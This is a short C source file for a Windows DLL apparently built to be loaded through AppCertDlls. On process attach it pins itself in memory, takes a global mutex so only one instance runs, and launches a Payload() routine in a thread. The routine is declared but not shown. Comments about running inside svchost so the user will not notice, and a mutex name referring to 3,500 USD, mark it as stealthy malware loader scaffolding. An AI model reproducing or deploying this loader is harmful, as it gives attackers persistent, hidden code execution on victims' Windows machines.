#include <Windows.h>

void Payload();

DWORD WINAPI ThreadFunction(PVOID n)
{
    LPCWSTR mutexName = L"Global\\ThatMomentWhenYouRealizeYourePoorAndDontHave3500USD";
    HANDLE m_hMutex = CreateMutexExW(NULL, mutexName, 0, SYNCHRONIZE);
    if (!m_hMutex)
    {
        ; // can't access
    }
    else if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ; // is already running on this machine! Aborting!";
    }
    else
    {
        // no instance is running yet
        Payload();
    }

    CloseHandle(m_hMutex);

    return 0;
}

// should probably run if process = svchost so that user wont notice the blocking

BOOL init_started = FALSE;
BOOL payload_started = FALSE;

HMODULE myhmodule;

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Can't call CreateProcess, WinExec, etc when this is being used as a AppCertDlls DLL cause it'll cause a deadlock and the application will freeze
        // So payload will be executed in a thread
        if (!payload_started)
        {
            payload_started = TRUE;
            // Increase ref count to prevent DLL from being unloaded after DllMain returns
            GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (PCWSTR)ThreadFunction, &myhmodule);
            CloseHandle(
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFunction, NULL, 0, NULL)
            );
        }
        break;
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

